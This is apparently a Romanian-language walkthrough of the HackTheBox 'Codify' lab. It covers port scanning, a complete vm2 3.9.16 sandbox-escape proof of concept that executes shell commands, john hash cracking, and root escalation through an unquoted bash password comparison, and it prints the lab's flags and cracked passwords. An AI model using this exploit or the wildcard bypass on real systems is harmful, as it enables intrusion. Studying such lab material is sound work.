1. Scanam masina ca sa gasim porturile deschise pe masina
```bash
nmap -sSCV -T 4 -p- -oN /home/h1p/HackTheBox/Labs/codify.nmap.scan 10.10.11.239
```
![[Pasted image 20231109143707.png]]
Vedem 2 porturi deschise 22 [[ssh]] si 80 [[http]]
2. Adaugam in fisierul `/etc/hosts` hostul nostru `10.10.11.239    codify.htb`
![[Pasted image 20231109143834.png]]
3. Putem vedea ce fel de framework lucreaza aplicatia noastra.
![[Pasted image 20231110112419.png]]
Vedem si codul sursa
![[Pasted image 20231110112514.png]]
Avem si versiune exacta la acest framework `vm2 3.9.16`
4. Pe google facem un search pentru vulnerabilitatea data ca sa vedem daca nu gasim o vulnerabilitate.
![[Pasted image 20231110112654.png]]
`Proof of concept` este singur codul pentru exploit din emaginea mai sus vedem ca este vulnerabil si este si exploitul aici -> https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244
```js
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
}
`

console.log(vm.run(code));
```
In loc de `touch pwned` punem orice commanda care dorim sa se execute.
![[Pasted image 20231110113009.png]]
Nu putem primi un revers shell din care motive nu stiu.
![[Pasted image 20231110113208.png]]
Facem in felul urmator:
a) Rulam un server cu ajutorul lui [[python3]] 
![[Pasted image 20231110115301.png]]
b) Acesam shell sil transmitem in bash
![[Pasted image 20231110115329.png]]
c) Vualea avem si shell-ul 
![[Pasted image 20231110115359.png]]
d) Dar nu avem flagul de user deci trebuie sa primim cumva aces la utilizatorul `joshua`
5. Am gasit ceva dar este in forma de hash:
![[Pasted image 20231110120914.png]]
```hash
joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```
6. Cu ajutorul la [[john]] putem sa spargem parola:
```bahs
john -w=/usr/share/wordlist.txt hash.joshua
```
![[Pasted image 20231110121448.png]]
Parola este ->`spongebob1`
7. Ne logam ca `joshua` cu [[ssh]] care este pe portul 22.
`ssh`
![[Pasted image 20231110121709.png]]
8. Am gasit si vectorul ca sami ridic privilegile.
![[Pasted image 20231110121823.png]]
9. Am uitat sa inregistres flagul pentru user 
User flag -> `23f9cc65993bc189e354dab8f860f41c`
![[Pasted image 20231110122009.png]]
10. Continuam acesta este continutul scriptului nostru:
```bash
#!/bin/bash  
DB_USER="root"  
DB_PASS=$(/usr/bin/cat /root/.creds)  
BACKUP_DIR="/var/backups/mysql"  
  
read -s -p "Enter MySQL password for $DB_USER: " USER_PASS  
/usr/bin/echo  
  
if [[ $DB_PASS == $USER_PASS ]]; then  
       /usr/bin/echo "Password confirmed!"  
else  
       /usr/bin/echo "Password confirmation failed!"  
       exit 1  
fi  
  
/usr/bin/mkdir -p "$BACKUP_DIR"  
  
databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;  
" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")  
  
for db in $databases; do  
   /usr/bin/echo "Backing up database: $db"  
   /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bi  
n/gzip > "$BACKUP_DIR/$db.sql.gz"  
done  
  
/usr/bin/echo "All databases backed up successfully!"  
/usr/bin/echo "Changing the permissions"  
/usr/bin/chown root:sys-adm "$BACKUP_DIR"  
/usr/bin/chmod 774 -R "$BACKUP_DIR"  
/usr/bin/echo 'Done!'
```
Din scriptul de mai sus vedem ca variabila DB_PASS se transmite in clear text aceasta inseamna ca noi putem so vedem cu ochi dar in output ea nu este trebuie sa monitorizam procesele pentru a vedea acest lucru.
11. pspy64 ne permite acest lucru.
![[Pasted image 20231110123433.png]]
12. Dar mai este o problema el verifica cu un if daca passwor-durile sunt drepte si in cazul dat trebuie sa cunoastem cum se efectueaza aceste conditii.
In cazul nostru `$DB_PASS == $USER_PASS` nu se folosecte virgule la variabele deci daca facem constructia data de felul  `$DB_PASS == *` ea va returna `true`.
![[Pasted image 20231110124008.png]]
Acest lucru lucreaza lol kek
Avem si parola pentru root:
![[Pasted image 20231110124057.png]]
`-p` - este flag el nu este simbol al parolei
Parola pentru root `kljh12k3jhaskjh12kjh3`
![[Pasted image 20231110124207.png]]
Root flag `192de51b83fb386f97f3594ca94ec011`